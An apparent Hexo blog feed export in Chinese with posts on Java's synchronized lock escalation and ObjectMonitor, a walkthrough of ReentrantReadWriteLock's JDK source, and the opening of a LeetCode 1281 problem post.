<p>在32位的HotSpot虚拟机中，如果对象处于未被锁定的状态下，那么Mark Word的32bit空间里的25位用于存储对象哈希码，4bit用于存储对象分代年龄，2bit用于存储锁标志位，1bit固定为0，表示非偏向锁。其他状态如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-mark-word-detail.png" alt="Mark Word示例"></p>
<p>依据这张图，就可以更好地说明synchronized的锁升级流程了。众所周知，Java中锁升级是从无锁-&gt;偏向锁-&gt;轻量级锁-&gt;重量级锁，并且只能升级，不能降级。</p>
<p>下面就来结合mark word 来梳理下这个流程。</p>
<ol>
<li>当Mark Word 没有被当做是锁时，就是一个普通的对象，Mark Word记录对象的HashCode，锁标志位是01，是否为偏向锁那一位是0；</li>
<li>当对象被当做同步锁并有一个线程A抢到了锁时，锁的标志位还是01，但是否偏向锁那一位改成1，前23bit记录抢到锁的线程id，表示进入偏向锁状态；</li>
<li>当线程A再次试图来获取锁时，JVM发现同步锁对象的标志位是01，是否偏向锁是1，并且记录的线程id就是自己的id，那么线程A就继续执行同步的代码；</li>
<li>当线程B试图获取这个锁时，JVM发现同步锁处于偏向状态，但是Mark Word中记录的线程id不是B的id，那么线程B就会先尝试着用CAS操作获取锁。这里获取锁的操作是有可能成功的，因为线程A一般不会自动释放偏向锁。如果获取锁成功，就把Mark Word中的线程id改为线程B的id，代表线程B获得了这个偏向锁，可以执行同步代码。如果去获取锁失败，则执行步骤5；</li>
<li>偏向锁状态获取锁失败，代表当前锁存在一定的竞争，偏向锁将升级为轻量级锁。JVM会在线程B的线程栈中开辟一块独立的空间，里面保存指向对象所Mark Word的指针，同时在对象锁Mark Word中保存指向这片空间的指针。上述两个都是CAS操作，如果保存成功，代表线程B抢到了同步锁，就把Mark Word中的锁标志位改成00，可以执行同步锁代码。如果保存失败，表示抢锁失败，竞争太激烈，继续执行步骤6；</li>
<li>轻量级锁抢锁失败，JVM会使用自旋锁，自旋锁不是一个锁状态，只是代表不停地重试，尝试抢锁。从Java 1.7开始，自旋锁默认是启用的，自选次数由JVM决定（适应性自旋锁）。如果抢锁成功则执行同步锁代码，如果失败则继续执行步骤7；</li>
<li>自旋锁重试之后如果抢锁依然失败，同步锁会升级至重量级锁，锁标志位改为10，锁指针就指向monitor的起始地址。在这个状态下，未抢到锁的线程都会被阻塞。</li>
</ol>
<h3 id="实例数据"><a href="#实例数据" class="headerlink" title="实例数据"></a>实例数据</h3><p>对象的实例数据就是在java代码中能看到的属性和他们的值。</p>
<h3 id="对齐填充数据"><a href="#对齐填充数据" class="headerlink" title="对齐填充数据"></a>对齐填充数据</h3><p>因为JVM要求java的对象占的内存大小应该是8bit的倍数，所以后面有几个字节用于把对象的大小补齐至8bit的倍数，没有特别的功能。</p>
<h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><p>管程（monitor）可以被理解为是一种同步工具，或者是同步机制，它通常被描述为一个对象。操作系统的管程是概念原理，ObjectMonitor是它的原理实现。</p>
<h3 id="操作系统管程"><a href="#操作系统管程" class="headerlink" title="操作系统管程"></a>操作系统管程</h3><ul>
<li>管程是一种程序结构，结构内的多个子程序（对象或模块）形成的多个工作线程互斥访问共享资源。</li>
<li>这些共享资源一般是硬件设备或一群变量。管程实现了在一个时间点，最多只有一个线程在执行管程的某个子程序。</li>
<li>与那些通过修改数据结构实现互斥访问的并发程序设计相比，管程实现很大程度上简化了程序设计。</li>
<li>管程提供了一种机制，线程可以临时放弃互斥访问，等待某些条件得到满足后，重新获得执行权恢复它的互斥访问。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor.png" alt="monitor"></p>
<h3 id="ObjectMonitor"><a href="#ObjectMonitor" class="headerlink" title="ObjectMonitor"></a>ObjectMonitor</h3><p>ObjectMonitor主要数据结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ObjectMonitor() &#123;</span><br><span class="line">    _header       = <span class="literal">NULL</span>;</span><br><span class="line">    _count        = <span class="number">0</span>; <span class="comment">//记录个数</span></span><br><span class="line">    _waiters      = <span class="number">0</span>,</span><br><span class="line">    _recursions   = <span class="number">0</span>;</span><br><span class="line">    _object       = <span class="literal">NULL</span>;</span><br><span class="line">    _owner        = <span class="literal">NULL</span>;</span><br><span class="line">    _WaitSet      = <span class="literal">NULL</span>; <span class="comment">//处于wait状态的线程，会被加入到_WaitSet</span></span><br><span class="line">    _WaitSetLock  = <span class="number">0</span> ;</span><br><span class="line">    _Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">    _succ         = <span class="literal">NULL</span> ;</span><br><span class="line">    _cxq          = <span class="literal">NULL</span> ;</span><br><span class="line">    FreeNext      = <span class="literal">NULL</span> ;</span><br><span class="line">    _EntryList    = <span class="literal">NULL</span> ; <span class="comment">//处于等待锁block状态的线程，会被加入到该列表</span></span><br><span class="line">    _SpinFreq     = <span class="number">0</span> ;</span><br><span class="line">    _SpinClock    = <span class="number">0</span> ;</span><br><span class="line">    OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ObjectMonitor主要字段释义如下：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor-keyword.png" alt="monitor"></p>
<p>ObjectMonitor中有两个队列，_WaitSet和_EntryList，用来保存ObjectWaiter对象列表（每个等待锁的线程都会被封装成ObjectWaiter对象），_owner指向持有ObjectMonitor对象的线程。</p>
<p>当多个线程同时访问一段同步代码时，首先会进入_EntryList，当线程获取到对象的monitor后，进入owner区域，并把monitor中的owner变量设置为当前线程，同时monitor中的计数器count自增1.</p>
<p>如果线程调用wait方法，将释放当前持有的monitor，owner变量恢复为null，计数器count自减1，同时该线程进入Waitset中等待被唤醒。</p>
<p>如果其他线程调用 notify() / notifyAll() ，会唤醒_WaitSet中的某个线程，该线程再次尝试获取monitor锁，成功即进入_Owner区域。</p>
<p>若当前线程也执行完毕，也会释放monitor并复位变量的值，以便其他线程进入获取monitor。如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor-flow.png" alt="monitor"></p>
<h2 id="对象与monitor关联"><a href="#对象与monitor关联" class="headerlink" title="对象与monitor关联"></a>对象与monitor关联</h2><p><img src="https://huhansi.github.io/images/2020-03-11-monitor-guanlian.png" alt="monitor"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/javazejian/article/details/72828483?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">深入理解Java并发之synchronized实现原理</a></p>
<p><a href="https://juejin.im/post/5d5374076fb9a06ac76da894" target="_blank" rel="noopener">Synchronized解析——如果你愿意一层一层剥开我的心</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>synchronized</tag>
      </tags>
  </entry>
  <entry>
    <title>ReentrantReadWriteLock解析</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-06-ReentrantReadWriteLock%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ReentrantReadWriteLock解析"><a href="#ReentrantReadWriteLock解析" class="headerlink" title="ReentrantReadWriteLock解析"></a>ReentrantReadWriteLock解析</h1><p>前文提到的synchronized关键和和ReentrantLock，它们都是独占式锁，排他锁。在同一时刻只能有一个线程获取多。这个就非常不适合那种读多写少的场景。</p>
<p>如果有多个线程需要读取共享数据，极少数甚至只有一个线程写共享数据的话，就非常不划算了。读操作对数据没有影响，完全可以并发进行。</p>
<p>于是Java提供了另外一个实现了Lock接口的ReentrantReadWriteLock（可重入读写锁）。使用这个锁时，多个读线程可以在同一个时刻访问共享资源。但是在写线程访问的时候，所有的读线程和其他写线程都会被阻塞。</p>
<p>它还有以下特点：</p>
<ol>
<li>支持公平锁和非公平锁，默认非公平锁</li>
<li>可重入。不管是读锁还是写锁，线程在获取之后，还能再次获取。写锁在成功获取之后，也能获取读锁。</li>
<li>锁降级：遵循获取写锁，获取读锁，然后释放写锁的次序，写锁就能降级为读锁。</li>
</ol>
<h2 id="类结构"><a href="#类结构" class="headerlink" title="类结构"></a>类结构</h2><p>请见下图</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-ReentrantReadWriteLock.png" alt="ReentrantReadWriteLock类结构图"></p>
<p>在分别分析读写锁之前，我们看下读写锁在Sync中时怎么计数的。</p>
<p>在ReentrantReadWriteLock的内部抽象静态类中有这么几句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Read vs write count extraction constants and functions.</span></span><br><span class="line"><span class="comment">         * Lock state is logically divided into two unsigned shorts:</span></span><br><span class="line"><span class="comment">         * The lower one representing the exclusive (writer) lock hold count,</span></span><br><span class="line"><span class="comment">         * and the upper the shared (reader) hold count.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHARED_SHIFT   = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHARED_UNIT    = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_COUNT      = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EXCLUSIVE_MASK = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Returns the number of shared holds represented in count  */</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sharedCount</span><span class="params">(<span class="keyword">int</span> c)</span>    </span>&#123; <span class="keyword">return</span> c &gt;&gt;&gt; SHARED_SHIFT; &#125;</span><br><span class="line">        <span class="comment">/** Returns the number of exclusive holds represented in count  */</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">exclusiveCount</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123; <span class="keyword">return</span> c &amp; EXCLUSIVE_MASK; &#125;</span><br></pre></td></tr></table></figure>

<p>其中方法sharedCount是用作获取读锁被获取的次数。它将同步状态c右移16位，取它的高16位。</p>
<p>方法exclusiveCount是用作获取写锁被获取的次数。EXCLUSIVE_MASK为1左移16位，然后减1，即为0x0000FFFF。然后和当前的同步状态C相与，获取同步状态的低16位。</p>
<p>示意图如下：</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-state-bit.png" alt="同步状态高低位示意"></p>
<h2 id="写锁"><a href="#写锁" class="headerlink" title="写锁"></a>写锁</h2><h3 id="写锁的获取"><a href="#写锁的获取" class="headerlink" title="写锁的获取"></a>写锁的获取</h3><p>其他流程已经在AQS里面实现了，我们具体看一下写锁的tryAcquire方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Walkthrough:</span></span><br><span class="line"><span class="comment">             * 1. If read count nonzero or write count nonzero</span></span><br><span class="line"><span class="comment">             *    and owner is a different thread, fail.</span></span><br><span class="line"><span class="comment">             * 2. If count would saturate, fail. (This can only</span></span><br><span class="line"><span class="comment">             *    happen if count is already nonzero.)</span></span><br><span class="line"><span class="comment">             * 3. Otherwise, this thread is eligible for lock if</span></span><br><span class="line"><span class="comment">             *    it is either a reentrant acquire or</span></span><br><span class="line"><span class="comment">             *    queue policy allows it. If so, update state</span></span><br><span class="line"><span class="comment">             *    and set owner.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">int</span> w = exclusiveCount(c);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// (Note: if c != 0 and w == 0 then shared count != 0)</span></span><br><span class="line">                <span class="keyword">if</span> (w == <span class="number">0</span> || current != getExclusiveOwnerThread())</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                <span class="comment">// Reentrant acquire</span></span><br><span class="line">                setState(c + acquires);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (writerShouldBlock() ||</span><br><span class="line">                !compareAndSetState(c, c + acquires))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>大体流程是：</p>
<ol>
<li>如果同步状态c不为0，写锁被获取次数为0，说明此时有线程已经获取到了读锁，获取失败</li>
<li>亦或同步状态c不为0，当前线程不是获取写锁的线程，获取失败</li>
<li>亦或持有的写锁次数应超过最大可持有数目了。这里写锁只可有一个线程持有，但是可以重入MAX_COUNT次</li>
<li>如果上述情况均没有，则当前线程可获取写锁，设置同步状态，设置独占线程为线程本身</li>
</ol>
<p>注意到还有一个writerShouldBlock方法，这个方法在公平锁和非公平锁中的实现逻辑是不一样的。</p>
<p>在公平锁中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writerShouldBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> hasQueuedPredecessors();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>它是以队列里面是否有正在等候的线程来判断的。</p>
<p>而非公平锁中直接返回false，因为非公平锁是支持抢占的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writerShouldBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// writers can always barge</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="写锁的释放"><a href="#写锁的释放" class="headerlink" title="写锁的释放"></a>写锁的释放</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Note that tryRelease and tryAcquire can be called by</span></span><br><span class="line"><span class="comment">         * Conditions. So it is possible that their arguments contain</span></span><br><span class="line"><span class="comment">         * both read and write holds that are all released during a</span></span><br><span class="line"><span class="comment">         * condition wait and re-established in tryAcquire.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">            <span class="keyword">int</span> nextc = getState() - releases;</span><br><span class="line">            <span class="keyword">boolean</span> free = exclusiveCount(nextc) == <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (free)</span><br><span class="line">                setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            setState(nextc);</span><br><span class="line">            <span class="keyword">return</span> free;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>流程基本上和ReentrantLock差不多，因为写锁是同步状态的低16位表示的，所以，直接用getState()-releases就行了。</p>
<h2 id="读锁"><a href="#读锁" class="headerlink" title="读锁"></a>读锁</h2><p>读锁和写锁不一样，它不是独占的，排他的，它是一种共享锁。同一时刻可以被多个线程获取。按照上一篇AQS文章中的介绍，读锁需要重写AQS中的tryAcquireShared和tryReleaseShared方法。</p>
<h3 id="读锁的获取"><a href="#读锁的获取" class="headerlink" title="读锁的获取"></a>读锁的获取</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Walkthrough:</span></span><br><span class="line"><span class="comment">             * 1. If write lock held by another thread, fail.</span></span><br><span class="line"><span class="comment">             * 2. Otherwise, this thread is eligible for</span></span><br><span class="line"><span class="comment">             *    lock wrt state, so ask if it should block</span></span><br><span class="line"><span class="comment">             *    because of queue policy. If not, try</span></span><br><span class="line"><span class="comment">             *    to grant by CASing state and updating count.</span></span><br><span class="line"><span class="comment">             *    Note that step does not check for reentrant</span></span><br><span class="line"><span class="comment">             *    acquires, which is postponed to full version</span></span><br><span class="line"><span class="comment">             *    to avoid having to check hold count in</span></span><br><span class="line"><span class="comment">             *    the more typical non-reentrant case.</span></span><br><span class="line"><span class="comment">             * 3. If step 2 fails either because thread</span></span><br><span class="line"><span class="comment">             *    apparently not eligible or CAS fails or count</span></span><br><span class="line"><span class="comment">             *    saturated, chain to version with full retry loop.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">if</span> (exclusiveCount(c) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                getExclusiveOwnerThread() != current)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> r = sharedCount(c);</span><br><span class="line">            <span class="keyword">if</span> (!readerShouldBlock() &amp;&amp;</span><br><span class="line">                r &lt; MAX_COUNT &amp;&amp;</span><br><span class="line">                compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">                    firstReader = current;</span><br><span class="line">                    firstReaderHoldCount = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                    firstReaderHoldCount++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    HoldCounter rh = cachedHoldCounter;</span><br><span class="line">                    <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                        cachedHoldCounter = rh = readHolds.get();</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                        readHolds.set(rh);</span><br><span class="line">                    rh.count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> fullTryAcquireShared(current);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>JDK源码自带的注释已经说得很清楚了。</p>
<ol>
<li>如果写锁被其他线程获取了，获取读锁失败</li>
<li>否则，获取读锁成功，更新同步状态，只更新同步状态c的高16位的值</li>
<li>无论是CAS失败或者同一线程再次获取读锁时，都会调用fullTryAcquireShared方法</li>
</ol>
<p><strong>fullTryAcquireShared</strong>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Full version of acquire for reads, that handles CAS misses</span></span><br><span class="line"><span class="comment">         * and reentrant reads not dealt with in tryAcquireShared.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">fullTryAcquireShared</span><span class="params">(Thread current)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * This code is in part redundant with that in</span></span><br><span class="line"><span class="comment">             * tryAcquireShared but is simpler overall by not</span></span><br><span class="line"><span class="comment">             * complicating tryAcquireShared with interactions between</span></span><br><span class="line"><span class="comment">             * retries and lazily reading hold counts.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            HoldCounter rh = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">int</span> c = getState();</span><br><span class="line">                <span class="keyword">if</span> (exclusiveCount(c) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (getExclusiveOwnerThread() != current)</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// else we hold the exclusive lock; blocking here</span></span><br><span class="line">                    <span class="comment">// would cause deadlock.</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readerShouldBlock()) &#123;</span><br><span class="line">                    <span class="comment">// Make sure we're not acquiring read lock reentrantly</span></span><br><span class="line">                    <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                        <span class="comment">// assert firstReaderHoldCount &gt; 0;</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            rh = cachedHoldCounter;</span><br><span class="line">                            <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current)) &#123;</span><br><span class="line">                                rh = readHolds.get();</span><br><span class="line">                                <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                                    readHolds.remove();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (sharedCount(c) == MAX_COUNT)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (sharedCount(c) == <span class="number">0</span>) &#123;</span><br><span class="line">                        firstReader = current;</span><br><span class="line">                        firstReaderHoldCount = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                        firstReaderHoldCount++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span>)</span><br><span class="line">                            rh = cachedHoldCounter;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                            rh = readHolds.get();</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                            readHolds.set(rh);</span><br><span class="line">                        rh.count++;</span><br><span class="line">                        cachedHoldCounter = rh; <span class="comment">// cache for release</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>代码和tryAcquireShared类似。就是一个dead loop，不断去尝试设置同步状态。</p>
<h3 id="读锁的释放"><a href="#读锁的释放" class="headerlink" title="读锁的释放"></a>读锁的释放</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryReleaseShared</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                <span class="comment">// assert firstReaderHoldCount &gt; 0;</span></span><br><span class="line">                <span class="keyword">if</span> (firstReaderHoldCount == <span class="number">1</span>)</span><br><span class="line">                    firstReader = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    firstReaderHoldCount--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                HoldCounter rh = cachedHoldCounter;</span><br><span class="line">                <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                    rh = readHolds.get();</span><br><span class="line">                <span class="keyword">int</span> count = rh.count;</span><br><span class="line">                <span class="keyword">if</span> (count &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">                    readHolds.remove();</span><br><span class="line">                    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">throw</span> unmatchedUnlockException();</span><br><span class="line">                &#125;</span><br><span class="line">                --rh.count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">int</span> c = getState();</span><br><span class="line">                <span class="keyword">int</span> nextc = c - SHARED_UNIT;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(c, nextc))</span><br><span class="line">                    <span class="comment">// Releasing the read lock has no effect on readers,</span></span><br><span class="line">                    <span class="comment">// but it may allow waiting writers to proceed if</span></span><br><span class="line">                    <span class="comment">// both read and write locks are now free.</span></span><br><span class="line">                    <span class="keyword">return</span> nextc == <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="锁降级"><a href="#锁降级" class="headerlink" title="锁降级"></a>锁降级</h2><p>锁降级指的是写锁降级成为读锁。如果当前线程拥有写锁，然后将其释放，最后再获取读锁，这种分段完成的过程不能称之为锁降级。锁降级是指把持住（当前拥有的）写锁，再获取到读锁，随后释放（先前拥有的）写锁的过程。</p>
<p>可以看看官方文档对锁降级的示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CachedData</span> </span>&#123;</span><br><span class="line">   Object data;</span><br><span class="line">   <span class="keyword">volatile</span> <span class="keyword">boolean</span> cacheValid;</span><br><span class="line">   <span class="keyword">final</span> ReentrantReadWriteLock rwl = <span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">processCachedData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     rwl.readLock().lock();</span><br><span class="line">     <span class="keyword">if</span> (!cacheValid) &#123;</span><br><span class="line">       <span class="comment">// Must release read lock before acquiring write lock</span></span><br><span class="line">       rwl.readLock().unlock();</span><br><span class="line">       rwl.writeLock().lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// Recheck state because another thread might have</span></span><br><span class="line">         <span class="comment">// acquired write lock and changed state before we did.</span></span><br><span class="line">         <span class="keyword">if</span> (!cacheValid) &#123;</span><br><span class="line">           data = ...</span><br><span class="line">           cacheValid = <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// Downgrade by acquiring read lock before releasing write lock</span></span><br><span class="line">         rwl.readLock().lock();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         rwl.writeLock().unlock(); <span class="comment">// Unlock write, still hold read</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       use(data);</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">       rwl.readLock().unlock();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在释放写锁前，需要先获得读锁，然后再释放写锁。如果不先获取读锁，那么其他线程在这个线程释放写锁后可能会修改data，而这种修改对于这个线程是不可见的，从而在之后的use(data)中使用的是错误的值 。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>ReentrantReadWriteLock</tag>
      </tags>
  </entry>
  <entry>
    <title>1281. Subtract the Product and Sum of Digits of an Integer</title>
    <url>/2020/03/03/LeetCode/leetcode-001281.%20Subtract%20the%20Product%20and%20Sum%20of%20Digits%20of%20an%20Integer/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer number <code>n</code>, return the difference between the product of its digits and the sum of its digits.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: n &#x3D; 234</span><br><span class="line">Output: 15 </span><br><span class="line">Explanation: </span><br><span class="line">Product of digits &#x3D; 2 * 3 * 4 &#x3D; 24 </span><br><span class="line">Sum of digits &#x3D; 2 + 3 + 4 &#x3D; 9 </span><br><span class="line">Result &#x3D; 24 - 9 &#x3D; 15</span><br></pre></td></tr></table></figure>

